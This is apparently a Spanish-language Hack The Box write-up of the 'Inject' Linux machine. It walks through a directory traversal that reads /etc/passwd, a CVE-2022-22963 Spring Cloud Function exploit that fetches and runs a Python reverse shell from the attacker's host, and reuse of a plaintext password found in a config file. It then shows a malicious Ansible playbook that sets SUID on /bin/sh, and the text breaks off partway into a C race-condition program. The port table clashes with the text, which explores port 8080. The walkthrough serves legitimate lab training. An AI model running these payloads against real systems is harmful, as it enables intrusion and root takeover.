data-astro-cid-qtyrxm4s><div class=meta-icon data-astro-cid-qtyrxm4s><svg data-icon=material-symbols:calendar-today-outline-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-qtyrxm4s><symbol id=ai:material-symbols:calendar-today-outline-rounded><path d="M5 22q-.825 0-1.412-.587T3 20V6q0-.825.588-1.412T5 4h1V3q0-.425.288-.712T7 2t.713.288T8 3v1h8V3q0-.425.288-.712T17 2t.713.288T18 3v1h1q.825 0 1.413.588T21 6v14q0 .825-.587 1.413T19 22zm0-2h14V10H5zM5 8h14V6H5zm0 0V6z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:calendar-today-outline-rounded></use></svg></div><span class="text-sm text-50 font-medium" data-astro-cid-qtyrxm4s>2024-04-01</span></div><div class="flex items-center" data-astro-cid-qtyrxm4s><div class=meta-icon data-astro-cid-qtyrxm4s><svg data-icon=material-symbols:menu-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-qtyrxm4s><symbol id=ai:material-symbols:menu-rounded><path d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h16q.425 0 .713.288T21 17t-.288.713T20 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:menu-rounded></use></svg></div><div class="flex items-center flex-row flex-nowrap" data-astro-cid-qtyrxm4s><a href=/archive/category/HackTheBox/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts in the HackTheBox category" data-astro-cid-qtyrxm4s>HackTheBox</a></div></div><div class="flex items-center" data-astro-cid-qtyrxm4s><div class=meta-icon data-astro-cid-qtyrxm4s><svg data-icon=material-symbols:tag-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-qtyrxm4s><symbol id=ai:material-symbols:tag-rounded><path d="m9 16l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T6.3 18.8L7 16H4.275q-.5 0-.8-.387T3.3 14.75q.075-.35.35-.55t.625-.2H7.5l1-4H5.775q-.5 0-.8-.387T4.8 8.75q.075-.35.35-.55t.625-.2H9l.825-3.275Q9.9 4.4 10.15 4.2t.6-.2q.475 0 .775.375t.175.825L11 8h4l.825-3.275q.075-.325.325-.525t.6-.2q.475 0 .775.375t.175.825L17 8h2.725q.5 0 .8.387t.175.863q-.075.35-.35.55t-.625.2H16.5l-1 4h2.725q.5 0 .8.388t.175.862q-.075.35-.35.55t-.625.2H15l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T12.3 18.8L13 16zm.5-2h4l1-4h-4z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:tag-rounded></use></svg></div><div class="flex items-center flex-row flex-nowrap" data-astro-cid-qtyrxm4s><div class="text-sm mx-1.5 text-[var(--meta-divider)] hidden" data-astro-cid-qtyrxm4s>/</div><a href=/archive/tag/Linux/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts with the Linux tag" data-astro-cid-qtyrxm4s>Linux</a><div class="text-sm mx-1.5 text-[var(--meta-divider)]" data-astro-cid-qtyrxm4s>/</div><a href=/archive/tag/Easy/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts with the Easy tag" data-astro-cid-qtyrxm4s>Easy</a></div></div></div></div><div class="overflow-hidden relative rounded-xl banner-container mb-8 onload-animation"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="" decoding=async height=375 loading=lazy src=/_astro/featured.C-DaaVP5_Z2f8Sqp.webp width=666 class="w-full h-full object-cover" style=object-position:center></div><div class="onload-animation custom-md dark:prose-invert markdown-content max-w-none mb-6 prose prose-base" data-pagefind-body><p>Inject es una máquina Linux fácil creada por rajHere en Hack The Box que consiste en explotar un bug de Directory Traversal para localizar y leer archivos locales como frank. Usamos esta vulnerabilidad para enumerar las versiones de software involucradas en el servidor web, donde encontramos una instalación desactualizada de Spring Framework que es vulnerable a un bug crítico rastreado como CVE-2022-22963. Este fallo se utiliza entonces para obtener la ejecución de código como frank, y encontrar credenciales para phil en el directorio home de frank. El usuario phil tiene permiso para escribir playbooks de Ansible en un determinado directorio que es utilizado por root en trabajos CRON programados. Con un playbook especial, somos capaces de ejecutar código como root y obtener la bandera del sistema</p><h2 id=initial-recon><span style=color:#33acff>Initial Recon</span><a href=#initial-recon class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>Vamos a configurar nuestro entorno y ejecutar un escaneo de puertos TCP con esta envoltura nmap personalizada.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># mhil4ne@Kali (bash)</span></span>
<span class=line><span style=color:#e1e4e8>rhost</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"10.10.11.204"</span><span style=color:#6a737d> # Target IP address</span></span>
<span class=line><span style=color:#e1e4e8>lhost</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"10.10.14.4"</span><span style=color:#6a737d> # Your VPN IP address</span></span>
<span class=line><span style=color:#79b8ff>echo</span><span style=color:#9ecbff> rhost=</span><span style=color:#e1e4e8>$rhost </span><span style=color:#f97583>>></span><span style=color:#9ecbff> .env</span></span>
<span class=line><span style=color:#79b8ff>echo</span><span style=color:#9ecbff> lhost=</span><span style=color:#e1e4e8>$lhost </span><span style=color:#f97583>>></span><span style=color:#9ecbff> .env</span></span>
<span class=line><span style=color:#79b8ff>.</span><span style=color:#9ecbff> ./.env</span><span style=color:#e1e4e8> &#x26;&#x26; </span><span style=color:#b392f0>ctfscan</span><span style=color:#e1e4e8> $rhost</span></span>
<span class=line></span>
<span class=line></span></code></pre><p>The open ports reported in the scan include:</p><table><thead><tr><th>Port</th><th>Service</th><th>Product</th><th>Version</th></tr></thead><tbody><tr><td>22</td><td>ssh</td><td>OpenSSH</td><td>8.9p1</td></tr><tr><td>80</td><td>HTTP</td><td>Nagios NSCA</td><td></td></tr></tbody></table><h2 id=web><span style=color:#33acff>Web</span><a href=#web class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>Comenzaremos explorando el servidor HTTP en el puerto 8080 ya que los servicios web suelen ser vulnerables. También vamos a enrutar nuestras peticiones a través de nuestro proxy local BurpSuite o simplemente utilizar el navegador incorporado de BurpSuite.</p><p><img alt=img decoding=async height=706 loading=lazy src=/_astro/1.CSmfe6jW_Js1h0.webp width=1146></p><p>La página de inicio presenta algunas características, incluida la posibilidad de subir archivos. Vamos a echar un vistazo a esa página, ya que la carga de archivos es un terreno resbaladizo en lo que respecta a la seguridad.</p><p><img alt=img decoding=async height=339 loading=lazy src=/_astro/2.RL3OsWRK_ddouK.webp width=1227></p><p>Intentaremos subir un archivo en nuestra sesión de navegador mientras capturamos la petición con BurpSuite.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>POST</span><span style=color:#9ecbff> /upload</span><span style=color:#9ecbff> HTTP/1.1</span></span>
<span class=line><span style=color:#b392f0>Host:</span><span style=color:#9ecbff> 10.10.11.204:8080</span></span>
<span class=line><span style=color:#b392f0>Content-Length:</span><span style=color:#79b8ff> 220</span></span>
<span class=line><span style=color:#b392f0>Content-Type:</span><span style=color:#9ecbff> multipart/form-data</span><span style=color:#e1e4e8>; boundary</span><span style=color:#f97583>=</span><span style=color:#9ecbff>----WebKitFormBoundaryAPgIHu4nfmqDyyE2</span></span>
<span class=line><span style=color:#b392f0>User-Agent:</span><span style=color:#9ecbff> BurpSuite</span></span>
<span class=line><span style=color:#b392f0>Accept:</span><span style=color:#79b8ff> *</span><span style=color:#9ecbff>/</span><span style=color:#79b8ff>*</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>------WebKitFormBoundaryAPgIHu4nfmqDyyE2</span></span>
<span class=line><span style=color:#b392f0>Content-Disposition:</span><span style=color:#9ecbff> form-data</span><span style=color:#e1e4e8>; name</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"file"</span><span style=color:#e1e4e8>; filename</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"demo.txt"</span></span>
<span class=line><span style=color:#b392f0>Content-Type:</span><span style=color:#9ecbff> text/plain</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>This</span><span style=color:#9ecbff> is</span><span style=color:#9ecbff> a</span><span style=color:#9ecbff> standard</span><span style=color:#9ecbff> UTF-8</span><span style=color:#9ecbff> text</span><span style=color:#9ecbff> file...</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>------WebKitFormBoundaryAPgIHu4nfmqDyyE2--</span></span>
<span class=line></span>
<span class=line></span></code></pre><p><img alt=img decoding=async height=349 loading=lazy src=/_astro/3.B5iGHqg9_1ET2UP.webp width=1209></p><p>La respuesta indica que el formulario acepta exclusivamente archivos de imagen, así que intentaremos subir una imagen.</p><p><img alt=img decoding=async height=325 loading=lazy src=/_astro/4.Bu4wqmqy_23v1GP.webp width=1221></p><p>La carga se ha realizado correctamente y podemos ver la imagen dinámicamente en el punto final /show_image.</p><p><img alt=img decoding=async height=703 loading=lazy src=/_astro/5.D5RUzLyz_8ez40.webp width=1514></p><h3 id=file-disclosure>File Disclosure<a href=#file-disclosure class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Parece que el archivo de imagen se carga dinámicamente desde el sistema de archivos utilizando el parámetro img. Veamos si podemos leer algún archivo fuera de nuestro directorio de trabajo como /etc/passwd.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># mhil4ne@kali (bash)</span></span>
<span class=line><span style=color:#b392f0>curl</span><span style=color:#9ecbff> "http://</span><span style=color:#e1e4e8>$rhost</span><span style=color:#9ecbff>:8080/show_image?img=../../../../../../etc/passwd"</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>root:.x:0:0:root:/root:/bin/bash</span></span>
<span class=line><span style=color:#b392f0>daemon:.x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></span>
<span class=line><span style=color:#b392f0>bin:.x:2:2:bin:/bin:/usr/sbin/nologin</span></span>
<span class=line><span style=color:#79b8ff>...</span></span>
<span class=line></span></code></pre><p>Aparentemente podemos usar este endpoint para leer archivos locales usando un payload genérico de directory traversal. Trasteando un poco más, descubrimos que también podemos listar directorios.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># mhil4ne@kali (bash)</span></span>
<span class=line><span style=color:#b392f0>curl</span><span style=color:#9ecbff> "http://</span><span style=color:#e1e4e8>$rhost</span><span style=color:#9ecbff>:8080/show_image?img=../../../../../../"</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=plaintext style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span>bin</span></span>
<span class=line><span>boot</span></span>
<span class=line><span>dev</span></span>
<span class=line><span>...</span></span>
<span class=line><span></span></span></code></pre><h3 id=remote-code-execution>Remote Code Execution<a href=#remote-code-execution class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Encontremos el origen de la aplicación para poder buscar credenciales o una superficie de ataque adicional.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># mhil4ne@kali (bash)</span></span>
<span class=line><span style=color:#b392f0>inject_fetch</span><span style=color:#e1e4e8>() { </span><span style=color:#b392f0>curl</span><span style=color:#79b8ff> -sm</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> "http://</span><span style=color:#e1e4e8>$rhost</span><span style=color:#9ecbff>:8080/show_image?img="</span><span style=color:#ffab70>$@</span><span style=color:#e1e4e8>; }</span></span>
<span class=line><span style=color:#b392f0>inject_fetch</span><span style=color:#9ecbff> ../</span><span style=color:#6a737d> # read parent directory</span></span>
<span class=line><span style=color:#b392f0>inject_fetch</span><span style=color:#9ecbff> ../java</span><span style=color:#6a737d> # keep looking ...</span></span>
<span class=line></span></code></pre><p>Finalmente encontramos lo que parece ser la raíz del proyecto para la aplicación Java actual en ../../../{:.filepath}. Dentro de ese directorio, encontramos la configuración del proyecto Maven en pom.xml{:.filepath} que contiene un par de huellas de software notables.</p><ul><li>org.springframework.boot 2.6.5</li><li>spring-cloud-function-web 3.2.2</li></ul><p>Si buscamos vulnerabilidades con cualquiera de las dos huellas, vemos referencias a un par de CVE diferentes. Confirmamos que Spring Cloud Function versión 3.2.2 es vulnerable a CVE-2022-22963 comprobando la descripción CVEDetails.</p><blockquote><p>En las versiones 3.1.6, 3.2.2 y versiones anteriores no compatibles de Spring Cloud Function, al utilizar la funcionalidad de enrutamiento es posible que un usuario proporcione un SpEL especialmente diseñado como expresión de enrutamiento que puede dar lugar a la ejecución remota de código y al acceso a recursos locales.</p></blockquote><p>Ya hay un número de exploits de prueba de concepto por ahí, pero decidí crear uno de todos modos aquí. Vamos a utilizar este programa para generar una shell inversa que responde a un oyente PwnCat.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># mhil4ne@kali (bash)</span></span>
<span class=line><span style=color:#b392f0>pwncat-cs</span><span style=color:#79b8ff> -c</span><span style=color:#9ecbff> &#x3C;(</span><span style=color:#79b8ff>echo</span><span style=color:#9ecbff> "listen -m linux -H </span><span style=color:#e1e4e8>$lhost</span><span style=color:#9ecbff> 443")</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># mhil4ne@kali (bash)</span></span>
<span class=line><span style=color:#b392f0>inject_fetch</span><span style=color:#9ecbff> ../../../../../../usr/bin</span><span style=color:#f97583> |</span><span style=color:#b392f0> grep</span><span style=color:#9ecbff> '^python'</span><span style=color:#6a737d> # python3 is installed</span></span>
<span class=line><span style=color:#e1e4e8>tmp</span><span style=color:#f97583>=</span><span style=color:#e1e4e8>$(</span><span style=color:#b392f0>mktemp</span><span style=color:#79b8ff> -d</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>cat</span><span style=color:#f97583> &#x3C;&#x3C;</span><span style=color:#9ecbff> EOF</span><span style=color:#f97583> ></span><span style=color:#e1e4e8> $tmp</span><span style=color:#9ecbff>/index.html</span></span>
<span class=line><span style=color:#9ecbff>import os,pty,socket</span></span>
<span class=line><span style=color:#9ecbff>s=socket.socket()</span></span>
<span class=line><span style=color:#9ecbff>s.connect(("</span><span style=color:#e1e4e8>$lhost</span><span style=color:#9ecbff>",443))</span></span>
<span class=line><span style=color:#9ecbff>[os.dup2(s.fileno(),f)for(f)in(0,1,2)]</span></span>
<span class=line><span style=color:#9ecbff>pty.spawn("bash")</span></span>
<span class=line><span style=color:#9ecbff>EOF</span></span>
<span class=line><span style=color:#b392f0>python3</span><span style=color:#79b8ff> -m</span><span style=color:#9ecbff> http.server</span><span style=color:#79b8ff> --bind</span><span style=color:#e1e4e8> $lhost </span><span style=color:#79b8ff>--directory</span><span style=color:#e1e4e8> $tmp </span><span style=color:#79b8ff>80</span><span style=color:#e1e4e8> &#x26;</span></span>
<span class=line><span style=color:#b392f0>python3</span><span style=color:#9ecbff> CVE-2022-22963.py</span><span style=color:#9ecbff> "http://</span><span style=color:#e1e4e8>$rhost</span><span style=color:#9ecbff>:8080"</span><span style=color:#9ecbff> "curl </span><span style=color:#e1e4e8>$lhost</span><span style=color:#9ecbff> -o/tmp/_d"</span></span>
<span class=line><span style=color:#b392f0>python3</span><span style=color:#9ecbff> CVE-2022-22963.py</span><span style=color:#9ecbff> "http://</span><span style=color:#e1e4e8>$rhost</span><span style=color:#9ecbff>:8080"</span><span style=color:#9ecbff> "python3 /tmp/_d"</span></span>
<span class=line></span></code></pre><p>A continuación, debemos obtener una devolución de llamada a nuestro oyente en el puerto 443 como el usuario franco.</p><h2 id=privilege-escalation><span style=color:#33acff>Privilege Escalation</span><a href=#privilege-escalation class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><h3 id=frank>Frank<a href=#frank class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Empezaremos explorando el sistema de ficheros empezando por el directorio home de frank</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># frank@inject (bash)</span></span>
<span class=line><span style=color:#b392f0>find</span><span style=color:#9ecbff> ~</span><span style=color:#79b8ff> -type</span><span style=color:#9ecbff> f</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>/home/frank/.bashrc</span></span>
<span class=line><span style=color:#b392f0>/home/frank/.m2/settings.xml</span></span>
<span class=line><span style=color:#79b8ff>...</span></span>
<span class=line></span></code></pre><p>Hay un archivo de configuración de usuario Maven en ~/.m2/settings.xml{:.filepath} que contiene las credenciales para el usuario phil.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#f97583>&#x3C;?</span><span style=color:#e1e4e8>xml version</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"1.0"</span><span style=color:#e1e4e8> encoding</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"UTF-8"?</span><span style=color:#f97583>></span></span>
<span class=line><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>settings xmlns</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"http://maven.apache.org/POM/4.0.0"</span><span style=color:#b392f0> xmlns:xsi</span><span style=color:#9ecbff>=</span><span style=color:#b392f0>"http://www.w3.org/2001/XMLSchema-instance"</span></span>
<span class=line><span style=color:#b392f0>        xsi:schemaLocation</span><span style=color:#9ecbff>=</span><span style=color:#b392f0>"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#f97583>  &#x3C;</span><span style=color:#b392f0>servers</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#f97583>    &#x3C;</span><span style=color:#b392f0>server</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#f97583>      &#x3C;</span><span style=color:#b392f0>id</span><span style=color:#e1e4e8>></span><span style=color:#9ecbff>Inject</span><span style=color:#e1e4e8>&#x3C;/id></span></span>
<span class=line><span style=color:#f97583>      &#x3C;</span><span style=color:#b392f0>username</span><span style=color:#e1e4e8>></span><span style=color:#9ecbff>phil</span><span style=color:#e1e4e8>&#x3C;/username></span></span>
<span class=line><span style=color:#f97583>      &#x3C;</span><span style=color:#b392f0>password</span><span style=color:#e1e4e8>></span><span style=color:#9ecbff>DocPhillovestoInject123</span><span style=color:#e1e4e8>&#x3C;/password></span></span>
<span class=line><span style=color:#f97583>      &#x3C;</span><span style=color:#b392f0>privateKey</span><span style=color:#e1e4e8>>${user.home}</span><span style=color:#b392f0>/.ssh/id_dsa</span><span style=color:#e1e4e8>&#x3C;/privateKey></span></span>
<span class=line><span style=color:#f97583>      &#x3C;</span><span style=color:#b392f0>filePermissions</span><span style=color:#e1e4e8>></span><span style=color:#9ecbff>660</span><span style=color:#e1e4e8>&#x3C;/filePermissions></span></span>
<span class=line><span style=color:#f97583>      &#x3C;</span><span style=color:#b392f0>directoryPermissions</span><span style=color:#e1e4e8>></span><span style=color:#9ecbff>660</span><span style=color:#e1e4e8>&#x3C;/directoryPermissions></span></span>
<span class=line><span style=color:#f97583>      &#x3C;</span><span style=color:#b392f0>configuration</span><span style=color:#e1e4e8>>&#x3C;/configuration></span></span>
<span class=line><span style=color:#f97583>    &#x3C;</span><span style=color:#b392f0>/server</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#f97583>  &#x3C;</span><span style=color:#b392f0>/servers</span><span style=color:#e1e4e8>></span></span>
<span class=line><span style=color:#f97583>&#x3C;</span><span style=color:#e1e4e8>/settings</span><span style=color:#f97583>></span></span>
<span class=line></span></code></pre><h3 id=phil>Phil<a href=#phil class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Iniciaremos sesión como phil con su usando la contraseña DocPhillovestoInject123, tomaremos la bandera de usuario, luego ejecutaremos algunos comandos simples de enumeración.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># phil@inject (bash)</span></span>
<span class=line><span style=color:#b392f0>sudo</span><span style=color:#79b8ff> -l</span><span style=color:#6a737d> # no luck :(</span></span>
<span class=line><span style=color:#b392f0>id</span><span style=color:#6a737d> # staff group?</span></span>
<span class=line></span></code></pre><p>Con el comando id, descubre que phil es miembro de un grupo personalizado llamado staff. Veamos si este grupo tiene permisos especiales en el sistema de archivos.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># phil@inject (bash)</span></span>
<span class=line><span style=color:#b392f0>find</span><span style=color:#9ecbff> /</span><span style=color:#79b8ff> -group</span><span style=color:#9ecbff> staff</span><span style=color:#79b8ff> -ls</span><span style=color:#f97583> 2></span><span style=color:#9ecbff>/dev/null</span></span>
<span class=line></span></code></pre><p>La entrada más notable es el directorio <code>/opt/automation/tasks{:.nolineno}</code> que concede privilegios de escritura al grupo staff. Dentro de esa carpeta hay un archivo de configuración de sólo lectura (playbook) para un marco de automatización de TI conocido como Ansible. Dado que esto tiene que ver con la automatización, sospechamos que hay un trabajo CRON o algo similar que utiliza esta carpeta a ciertos intervalos. Usaremos PSpy para monitorizar procesos y encontrar tareas programadas.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># mhil4ne@kali (PwnCat phil@inject)</span></span>
<span class=line><span style=color:#b392f0>upload</span><span style=color:#9ecbff> pspy</span><span style=color:#9ecbff> /home/phil</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># phil@inject (bash)</span></span>
<span class=line><span style=color:#b392f0>chmod</span><span style=color:#9ecbff> +x</span><span style=color:#9ecbff> pspy</span><span style=color:#e1e4e8> &#x26;&#x26; </span><span style=color:#b392f0>./pspy</span><span style=color:#f97583> |</span><span style=color:#b392f0> tee</span><span style=color:#79b8ff> -a</span><span style=color:#9ecbff> pspy.log</span></span>
<span class=line></span></code></pre><p>Después de un par de minutos, encontramos una serie de procesos privilegiados que se ejecutan cada dos minutos y que interactúan con <code>/opt/automation/tasks{:.filepath}</code> de una manera potencialmente insegura.</p><ul><li>/usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml</li><li>/usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml</li><li>sleep 10</li><li>/usr/bin/rm -rf /opt/automation/tasks/*</li><li>/usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/</li></ul><p>El primer proceso en cuestión evalúa cualquier ruta que satisfaga /opt/automation/tasks/*.yml{:.filepath} como un playbook de Ansible. Deberíamos ser capaces de conseguir nuestro libro de jugadas evaluado desde /opt/automation/tasks{:.filepath} es escribible.</p><h3 id=ansible>Ansible<a href=#ansible class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Resulta que, la ejecución de comandos en un libro de jugadas Ansible es posible y bien documentado, lo que significa que debe ser capaz de escalar a la raíz de esta manera. Vamos a añadir una tarea que concederá el bit SUID a /bin/sh{:.filepath}, asegurándose de que limpiar después de nosotros mismos para no arruinar la caja para los demás.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>-</span><span style=color:#9ecbff> hosts:</span><span style=color:#9ecbff> localhost</span></span>
<span class=line><span style=color:#b392f0>  tasks:</span></span>
<span class=line><span style=color:#b392f0>  -</span><span style=color:#9ecbff> name:</span><span style=color:#9ecbff> pwn</span></span>
<span class=line><span style=color:#b392f0>    ansible.builtin.shell:</span><span style=color:#9ecbff> "chmod +s /bin/sh"</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># phil@inject (bash)</span></span>
<span class=line><span style=color:#b392f0>cat</span><span style=color:#f97583> &#x3C;&#x3C;</span><span style=color:#9ecbff> EOF</span><span style=color:#f97583> ></span><span style=color:#9ecbff> /opt/automation/tasks/pwnbook.yml</span></span>
<span class=line><span style=color:#9ecbff>- hosts: localhost</span></span>
<span class=line><span style=color:#9ecbff>  tasks:</span></span>
<span class=line><span style=color:#9ecbff>  - name: pwn</span></span>
<span class=line><span style=color:#9ecbff>    ansible.builtin.shell: chmod +s /bin/sh</span></span>
<span class=line><span style=color:#9ecbff>EOF</span></span>
<span class=line></span>
<span class=line></span></code></pre><p>Después de un par de minutos verificamos que /bin/sh{:.filepath} o /bin/dash{:.filepath} tienen SUID, y luego generamos un shell de root.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d># phil@inject (bash)</span></span>
<span class=line><span style=color:#b392f0>/bin/sh</span><span style=color:#79b8ff> -pi</span></span>
<span class=line></span></code></pre><h3 id=alternative-solution-bonus>Alternative Solution (Bonus)<a href=#alternative-solution-bonus class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Imaginemos que el comodín mágico utilizado para ejecutar nuestro propio libro de jugadas no existiera. Incluso sin esto, podemos resolver esta máquina abusando de una condición de carrera en un trabajo CRON. Mira, cada dos minutos root evalúa el playbook en /opt/automation/tasks/playbook_1.yml{:.filepath} junto con el siguiente comando:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>sleep</span><span style=color:#79b8ff> 10</span><span style=color:#e1e4e8> &#x26;&#x26;</span></span>
<span class=line><span style=color:#b392f0>  rm</span><span style=color:#79b8ff> -rf</span><span style=color:#9ecbff> /opt/automation/tasks/</span><span style=color:#79b8ff>*</span><span style=color:#e1e4e8> &#x26;&#x26;</span></span>
<span class=line><span style=color:#b392f0>  cp</span><span style=color:#9ecbff> /root/playbook_1.yml</span><span style=color:#9ecbff> /opt/automation/tasks/</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=plaintext style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span> gantt</span></span>
<span class=line><span>  dateFormat mm:ss</span></span>
<span class=line><span>  axisFormat %M:%S</span></span>
<span class=line><span>  tickInterval 2minute</span></span>
<span class=line><span>  title Process creation flow</span></span>
<span class=line><span>  section CRON Job</span></span>
<span class=line><span>  Run playbook : crit, milestone, p1, 00:00, 0s</span></span>
<span class=line><span>  Sleep : p2, 00:00, 10s</span></span>
<span class=line><span>  Remove playbooks : milestone, p3, 00:10, 0s</span></span>
<span class=line><span>  Copy original playbook to tasks folder : milestone, p4, 00:10, 0s</span></span>
<span class=line><span>  CRON Wait : w, 00:00, 2m</span></span>
<span class=line><span></span></span></code></pre><p>Si observamos la temporización de las llamadas en nuestro registro de PSpy, nos damos cuenta de que el libro de jugadas original se elimina y se sustituye en menos de un segundo. Resulta que podemos utilizar el tiempo entre estas acciones para evitar por completo que el playbook sea reemplazado. Para ello, creamos un directorio en /opt/automation/tasks/playbook_1.yml{:.filepath} mientras que la ruta no se reclama. Cuando la tarea intenta rellenar esa ruta, se encuentra con un error, ya que un archivo no puede sobrescribir un directorio, independientemente de los permisos que tenga. Una vez que el comando cp falla, eliminaremos el directorio y lo reemplazaremos con nuestro playbook malicioso, que se evaluará después de un par de minutos.</p><p>Sólo necesitamos crear un programa compilado rápido que sea lo suficientemente eficiente para cronometrar esto correctamente. El siguiente programa debería funcionar bien:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>//</span><span style=color:#9ecbff> gcc</span><span style=color:#79b8ff> -static</span><span style=color:#9ecbff> ./privesc2.c</span><span style=color:#79b8ff> -o</span><span style=color:#9ecbff> privesc2</span></span>
<span class=line><span style=color:#6a737d>#include &#x3C;stdio.h></span></span>
<span class=line><span style=color:#6a737d>#include &#x3C;stdlib.h></span></span>
<span class=line><span style=color:#6a737d>#include &#x3C;unistd.h></span></span>
<span class=line><span style=color:#6a737d>#include &#x3C;sys/stat.h></span></span>
<span class=line><span style=color:#6a737d>#include &#x3C;sys/types.h></span></span>
<span class=line></span>
<span class=line><span style=color:#6a737d>#define PLAYBOOK_PATH "/opt/automation/tasks/playbook_1.yml"</span></span>
